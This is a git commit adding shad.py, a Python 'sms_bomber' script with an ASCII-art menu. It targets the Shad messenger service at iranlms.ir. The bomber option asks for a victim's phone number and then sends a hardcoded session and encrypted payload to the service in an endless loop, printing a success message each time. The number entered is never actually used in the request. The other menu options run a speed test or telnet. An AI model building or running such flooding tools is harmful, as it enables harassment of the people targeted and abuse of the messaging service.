08c69d7ce906cec570dc6afb3bd1cda4174bb0a9
mohammadmahdi <76968302+mrmahdi8800@users.noreply.github.com>
2021-03-25 18:09:04 +0430

    Create shad.py

---
+++ shad.py
@@ -0,0 +1,50 @@
+import requests
+import os
+red='\033[31m'
+green='\033[32m'
+blue='\033[36m'
+pink='\033[35m'
+rang='\033[34m'
+link = "https://shadmessenger125.iranlms.ir"
+os.system("for i in {1..12}; do for j in $(seq 1 $i); do echo -ne $iÃ—$j=$((i*j))\\t;done; echo;done")
+os.system("clear")
+print(f"{red} ")
+print("        ,     \    /      , ")
+print("       / \    )\__/(     / \ ")
+print("      /   \  (_\  /_)   /   \ ")
+print(" ____/_____\__\@  @/___/_____\____ ")
+print("|             |\../|              | ")
+print("|              \VV/               | ")
+print("|     mamoozesh \/ mrmahdi        | ")
+print("|_________________________________| ")
+print(" |    /\ /      \\        \ /\    | ")
+print(" |  /   V       ))        V   \  | ")
+print(" |/     °       //        °     \| ")
+print(" °              V                ° ")
+print(f"{pink} ")
+print("∆ΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ∆")
+print(f"{blue} ")
+print("Telegram : @mrmahdi8800")
+print(f"{pink} ")
+print("∆ΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ∆")
+print(f"{green} ")
+print("|1|Start sms_bomber")
+print("|2|TestNet")
+print("|3|Exit")
+print(f"{rang} ")
+Elite = int(input("|∆|choose <>> : "))
+if Elite == 1:
+    number = input("please send number {9×××××××} : ")
+    while True:
+              requests.post(link,data={"api_version":"5","tmp_session":"nawjtnuoplaowiysovejapqnkaadmlql","data_enc":"P88sYpX3XyAvQQRTMG8qeZ96HCM7mISnA35UVP2x9H6HChcwmuJt0vnOeuH35yZj8P6FKlRrmFc4CZM5Rdcgx0RO9M+ys1JLEt7yO19ZaIRRn2AOqs3ZrXZ/slL6pjXlvngf59taGoRarKiULmKUKuHQ2ob+hkMm3WdYFqgtVLJ+uCdpxiz90VjAHjvQ3KSig9IVLJ7vN+LQfubFjKHiNMQGjp7hTF6/ApwHS3L0fWy/zVlhVfuLLENo2oq+MBbN"})
+              print("Successfully sended", number)
+elif Elite == 3:
+    os.system("clear")
+    os.system("figlet mrmahdi ")
+elif Elite == 2:
+    os.system("clear")
+    os.system("toilet mrmahdi")
+    os.system("pip install speedtest-cli")
+    os.system("speedtest-cli")
+elif Elite == 4:
+    os.system("telnet towel.blinkenlights.nl")
